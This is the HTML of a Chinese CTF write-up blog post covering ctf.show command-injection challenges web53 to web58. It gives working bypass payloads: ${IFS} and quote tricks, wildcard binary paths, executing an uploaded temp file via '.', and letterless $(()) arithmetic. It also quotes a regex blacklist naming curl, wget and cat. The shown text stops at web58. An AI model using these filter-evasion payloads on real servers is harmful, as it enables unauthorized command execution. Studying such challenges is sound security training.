@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="web53开启容器  试了下?c&#x3D;nl$&#123;IFS&#125;fla&#39;&#39;g.php||发现会直接回显，查看原题，发现本题命令执行不同 123 echo($c); $d &#x3D; system($c);   echo &quot;&lt;br&gt;&quot;.$d;  之前的一般是 1system($c);  辨析 本题命令执行 echo($c); 这行代码会直接输出变量 $c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web53-60">
+<meta property="og:url" content="https://youngking-gfy.github.io/2025/03/13/web53-60/index.html">
+<meta property="og:site_name" content="Youngking&#39;s Blog">
+<meta property="og:description" content="web53开启容器  试了下?c&#x3D;nl$&#123;IFS&#125;fla&#39;&#39;g.php||发现会直接回显，查看原题，发现本题命令执行不同 123 echo($c); $d &#x3D; system($c);   echo &quot;&lt;br&gt;&quot;.$d;  之前的一般是 1system($c);  辨析 本题命令执行 echo($c); 这行代码会直接输出变量 $c">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313134224781.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313134920900.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313135910470.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313140606876.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313140823051.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313142036065.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313142002182.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313142220642.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313142446737.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313142554186.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313143736793.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313144913951.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313145029390.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313145301365.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313150307377.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313150339663.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313150459563.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313152639239.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313152908237.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313153430503.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313153611223.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313154017552.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313154139785.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313154353270.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313154444430.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313154555902.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313154720666.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313154831648.png">
+<meta property="article:published_time" content="2025-03-13T05:32:57.000Z">
+<meta property="article:modified_time" content="2025-03-13T07:48:53.517Z">
+<meta property="article:author" content="Y0ungK1ng">
+<meta property="article:tag" content="命令执行">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313134224781.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>web53-60</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/youngking-gfy">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/03/13/web45-52/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://youngking-gfy.github.io/2025/03/13/web53-60/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://youngking-gfy.github.io/2025/03/13/web53-60/&text=web53-60"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://youngking-gfy.github.io/2025/03/13/web53-60/&title=web53-60"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://youngking-gfy.github.io/2025/03/13/web53-60/&is_video=false&description=web53-60"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=web53-60&body=Check out this article: https://youngking-gfy.github.io/2025/03/13/web53-60/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://youngking-gfy.github.io/2025/03/13/web53-60/&title=web53-60"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://youngking-gfy.github.io/2025/03/13/web53-60/&title=web53-60"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://youngking-gfy.github.io/2025/03/13/web53-60/&title=web53-60"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://youngking-gfy.github.io/2025/03/13/web53-60/&title=web53-60"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://youngking-gfy.github.io/2025/03/13/web53-60/&name=web53-60&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://youngking-gfy.github.io/2025/03/13/web53-60/&t=web53-60"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web53"><span class="toc-number">1.</span> <span class="toc-text">web53</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BE%A8%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">辨析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web54"><span class="toc-number">2.</span> <span class="toc-text">web54</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web55"><span class="toc-number">3.</span> <span class="toc-text">web55</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web56"><span class="toc-number">4.</span> <span class="toc-text">web56</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web57"><span class="toc-number">5.</span> <span class="toc-text">web57</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web58"><span class="toc-number">6.</span> <span class="toc-text">web58</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web59"><span class="toc-number">7.</span> <span class="toc-text">web59</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web60"><span class="toc-number">8.</span> <span class="toc-text">web60</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        web53-60
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Y0ungK1ng</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-13T05:32:57.000Z" class="dt-published" itemprop="datePublished">2025-03-13</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AE%89%E5%85%A8/">渗透安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><p>开启容器</p>
+<p><img src="/2025/03/13/web53-60/file-20250313134224781.png"></p>
+<p>试了下<br><code>?c=nl$&#123;IFS&#125;fla&#39;&#39;g.php||</code><br>发现会直接回显，查看原题，发现本题命令执行不同<br><img src="/2025/03/13/web53-60/file-20250313134920900.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line"> <span class="variable">$d </span>= <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);  </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br></pre></td></tr></table></figure>
+
+<p>之前的一般是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="辨析"><a href="#辨析" class="headerlink" title="辨析"></a>辨析</h4><ul>
+<li>本题命令执行<ul>
+<li><code>echo($c);</code><br> 这行代码会直接输出变量 $c 的值。如果 $c 是一个字符串，它会将字符串内容输出到浏览器或控制台。</li>
+<li><code>$d = system($c);</code><br> 这里的 system($c) 函数执行系统命令 $c，并将命令的输出直接发送到浏览器或控制台。同时，system 函数会返回命令的最后一条输出行，并将其赋值给变量 $d。</li>
+<li><code>echo &quot;&lt;br&gt;&quot;.$d;</code><br> 这行代码会输出变量 $d 的值，并在前面添加一个 HTML 换行符 <code>&lt;br&gt;</code>。变量 $d 包含的是命令 $c 执行后的最后一条输出行。</li>
+</ul>
+</li>
+<li><code>system($c);</code>传统命令执行<ul>
+<li>system($c);&#96;<br> 这行代码直接执行系统命令 $c，并将命令的输出直接发送到浏览器或控制台。system 函数会返回命令的最后一条输出行，但这里没有将返回值赋值给变量，因此无法进一步使用这个返回值。</li>
+</ul>
+</li>
+</ul>
+<p>测试一下 <code>?c=ls</code></p>
+<p><img src="/2025/03/13/web53-60/file-20250313135910470.png"></p>
+<p>先输出我们传入的内容，即<code> ls</code>的回显；紧接着直接输出 <code>ls</code> 执行的结果 <br><code>flag.php index.php readflag；</code><br><code>system</code> 函数返回命令输出的最后一行，执行结果最后一行是 <code>readflag</code>，所有 $d 的值是 <code>readflag</code>，前面还拼接了一个 <code>&quot;&lt;br&gt;&quot;</code>，因此会换行输出。</p>
+<p>其实刚开始的payload把<code>||</code>删掉即可，因为这里没有黑洞路径了<br>符号<code>$</code>也被放出<br>直接<br><code>?c=nl$&#123;IFS&#125;fla&#39;&#39;g.php</code></p>
+<p><img src="/2025/03/13/web53-60/file-20250313140606876.png"></p>
+<h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><p>开启容器</p>
+<p><img src="/2025/03/13/web53-60/file-20250313140823051.png"></p>
+<p>感觉是防止在特定字符串中用<code>\</code>等符号隐藏</p>
+<p>具体过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">;\|：匹配分号 ; 或者竖线 |。</span><br><span class="line">.*c.*a.*t.*：匹配包含字母 c、a、t 的字符串，且这三个字母可以按任意顺序出现，中间可以有其他字符。</span><br><span class="line">.*f.*l.*a.*g.*：匹配包含字母 f、l、a、g 的字符串，且这四个字母可以按任意顺序出现，中间可以有其他字符。</span><br><span class="line"> ：匹配空格。</span><br><span class="line">[0-9]：匹配任意数字。</span><br><span class="line">\*：匹配星号 *。</span><br><span class="line">.*m.*o.*r.*e.*：匹配包含字母 m、o、r、e 的字符串，且这四个字母可以按任意顺序出现，中间可以有其他字符。</span><br><span class="line">.*w.*g.*e.*t.*：匹配包含字母 w、g、e、t 的字符串，且这四个字母可以按任意顺序出现，中间可以有其他字符。</span><br><span class="line">.*l.*e.*s.*s.*：匹配包含字母 l、e、s 的字符串，且这三个字母可以按任意顺序出现，中间可以有其他字符。</span><br><span class="line">.*h.*e.*a.*d.*：匹配包含字母 h、e、a、d 的字符串，且这四个字母可以按任意顺序出现，中间可以有其他字符。</span><br><span class="line">.*s.*o.*r.*t.*：匹配包含字母 s、o、r、t 的字符串，且这四个字母可以按任意顺序出现，中间可以有其他字符。</span><br><span class="line">.*t.*a.*i.*l.*：匹配包含字母 t、a、i、l 的字符串，且这四个字母可以按任意顺序出现，中间可以有其他字符。</span><br><span class="line">.*s.*e.*d.*：匹配包含字母 s、e、d 的字符串，且这三个字母可以按任意顺序出现，中间可以有其他字符。</span><br><span class="line">.*c.*u.*t.*：匹配包含字母 c、u、t 的字符串，且这三个字母可以按任意顺序出现，中间可以有其他字符。</span><br><span class="line">.*t.*a.*c.*：匹配包含字母 t、a、c 的字符串，且这三个字母可以按任意顺序出现，中间可以有其他字符。</span><br><span class="line">.*a.*w.*k.*：匹配包含字母 a、w、k 的字符串，且这三个字母可以按任意顺序出现，中间可以有其他字符。</span><br><span class="line">.*s.*t.*r.*i.*n.*g.*s.*：匹配包含字母 s、t、r、i、n、g、s 的字符串，且这些字母可以按任意顺序出现，中间可以有其他字符。</span><br><span class="line">.*o.*d.*：匹配包含字母 o、d 的字符串，且这两个字母可以按任意顺序出现，中间可以有其他字符。</span><br><span class="line">.*c.*u.*r.*l.*：匹配包含字母 c、u、r、l 的字符串，且这四个字母可以按任意顺序出现，中间可以有其他字符。</span><br><span class="line">.*n.*l.*：匹配包含字母 n、l 的字符串，且这两个字母可以按任意顺序出现，中间可以有其他字符。</span><br><span class="line">.*s.*c.*p.*：匹配包含字母 s、c、p 的字符串，且这三个字母可以按任意顺序出现，中间可以有其他字符。</span><br><span class="line">.*r.*m.*：匹配包含字母 r、m 的字符串，且这两个字母可以按任意顺序出现，中间可以有其他字符。</span><br><span class="line">\|%|\x09|\x26|&gt;|&lt;：匹配反引号 ``  ``、百分号 %、制表符 \x09、与符号 \x26、大于号 &gt;、小于号 &lt;。</span><br></pre></td></tr></table></figure>
+
+
+<p><code>nl</code> 被过滤</p>
+<p>发现可以用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?c=rev$&#123;IFS&#125;fla?.php <span class="comment">//倒装的flag</span></span><br><span class="line">?c=uniq$&#123;IFS&#125;f???.php</span><br><span class="line">?c=vi$&#123;IFS&#125;fla?.php</span><br><span class="line">?c=/bin/?at$&#123;IFS&#125;f??????? <span class="comment">//官方flag</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/13/web53-60/file-20250313142036065.png"></p>
+<p><img src="/2025/03/13/web53-60/file-20250313142002182.png"></p>
+<p><img src="/2025/03/13/web53-60/file-20250313142220642.png"></p>
+<p>因为 Linux 有很多命令存放在 &#x2F;bin&#x2F; 目录下，可以通过绝对路径来使用，并且支持通配符。</p>
+<blockquote>
+<p><strong>Linux 下万物皆文件</strong></p>
+</blockquote>
+<p>也就是说 cat 命令也可这样用：&#x2F;bin&#x2F;?at</p>
+<p>我来本地试一下，只能说太细了</p>
+<p><img src="/2025/03/13/web53-60/file-20250313142446737.png"></p>
+<h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><p>开启容器</p>
+<p><img src="/2025/03/13/web53-60/file-20250313142554186.png"></p>
+<p>与上题目不同 字母被完全过滤</p>
+<p>网上学到</p>
+<blockquote>
+<p>无字母 rce 里还有一个点：<strong>临时文件上传</strong></p>
+</blockquote>
+<p>本地上传网页</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://e1e0a41d-33ba-4c8d-9940-fba9e31fc46d.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">        <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上传页面如下<br><img src="/2025/03/13/web53-60/file-20250313143736793.png"></p>
+<p>然后构造上传的<code>exp.txt</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p>上传并抓包</p>
+<p>发到重发器，添加 payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=.%20/???/????????[@-[]</span><br></pre></td></tr></table></figure>
+
+<p>成功RCE</p>
+<blockquote>
+<p><code>.(点)</code>的用法，就是相当于<code>source</code> 可以执行sh命令。</p>
+</blockquote>
+<p>接下来直接<code>cat flag.php</code>即可<br><img src="/2025/03/13/web53-60/file-20250313144913951.png"></p>
+<p><img src="/2025/03/13/web53-60/file-20250313145029390.png"></p>
+<blockquote>
+<p><code>%20</code> 是空格，我们这里使用点执行我们上传的文件，从而去执行内容中的 sh 命令，该文件会传到 &#x2F;tmp&#x2F;phpxxxxxx ，过滤了字母我们使用通配符问号代替，主要匹配的特征是文件名结尾的大写字母，大写字母不一定随机出现在最后一位，可能需要多试几次。</p>
+</blockquote>
+<p>第二种做法</p>
+<p>除了通过POST上传文件，执行文件里面的命令外，那linux中那么多sh命令，还有没有我们可以使用的呢？答案是肯定的</p>
+<blockquote>
+<p>&#x2F;bin&#x2F;base64命令</p>
+</blockquote>
+<p>&#x2F;bin&#x2F;base64的主要作用是对数据进行Base64编码或解码</p>
+<blockquote>
+<p>使用方法：&#x2F;bin&#x2F;base64 filename</p>
+</blockquote>
+<p>这个命令会将filename文件的内容进行Base64编码，并将结果输出 </p>
+<p> 因为不能出现字母，所以</p>
+<blockquote>
+<p>payload:?c&#x3D;&#x2F;???&#x2F;????64 ????.???</p>
+</blockquote>
+<p> 因为这里有64，所以不会匹配到其他命令<br> <br>最终得到base64加密的flag.php
+ </p>
+<h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><p>开启容器</p>
+<p><img src="/2025/03/13/web53-60/file-20250313145301365.png"><br><code>.</code>同样没过滤</p>
+<p>上题第二种base无法成功，</p>
+<p><img src="/2025/03/13/web53-60/file-20250313150307377.png"></p>
+<p><img src="/2025/03/13/web53-60/file-20250313150339663.png"></p>
+<h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><p>开启容器，提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag in 36.php</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/2025/03/13/web53-60/file-20250313150459563.png"></p>
+<p>变量可控，只需要把<code>$c</code>变为<code>36.php</code>即可</p>
+<p>数字、字母、’.’都被过滤</p>
+<p>我们给出主要解决无字母rce的一种方法就是<strong>利用自增运算符</strong>（用二进制理解）</p>
+<p>而这里恰好没有把$给过滤掉，其目的也显而易见</p>
+<blockquote>
+<p> 在linux中</p>
+<p>$(())&#x3D;0<br>$((~ $(()) ))&#x3D;-1</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$(())  </span><br><span class="line">//0</span><br><span class="line"> </span><br><span class="line">$((~$(())))</span><br><span class="line">//-1</span><br><span class="line"> </span><br><span class="line">$((~$(())))$((~$(())))</span><br><span class="line">//-1-1</span><br><span class="line"> </span><br><span class="line">$(($((~$(())))$((~$(())))))</span><br><span class="line">//-2</span><br><span class="line"> </span><br><span class="line">$((~$(($((~$(())))$((~$(())))))))</span><br><span class="line">//1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这样一直重复嵌套就可以先得到-37，-37就是用37个<code>$((~$(())))</code>串在一起，然后在外面加一层<code>$(())</code>就可以<br> 再对其取反，加一层$(())就可以得到36</p>
+</blockquote>
+<p><img src="/2025/03/13/web53-60/file-20250313152639239.png"></p>
+<p><img src="/2025/03/13/web53-60/file-20250313152908237.png"></p>
+<p><code>$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</code></p>
+<p><code>?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</code><br><img src="/2025/03/13/web53-60/file-20250313153430503.png"></p>
+<p><img src="/2025/03/13/web53-60/file-20250313153611223.png"></p>
+<p>web55-57 无字母RCE题目</p>
+<h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><p>开启容器</p>
+<p><img src="/2025/03/13/web53-60/file-20250313154017552.png"></p>
+<p>很明显有后端过滤</p>
+<p><img src="/2025/03/13/web53-60/file-20250313154139785.png"></p>
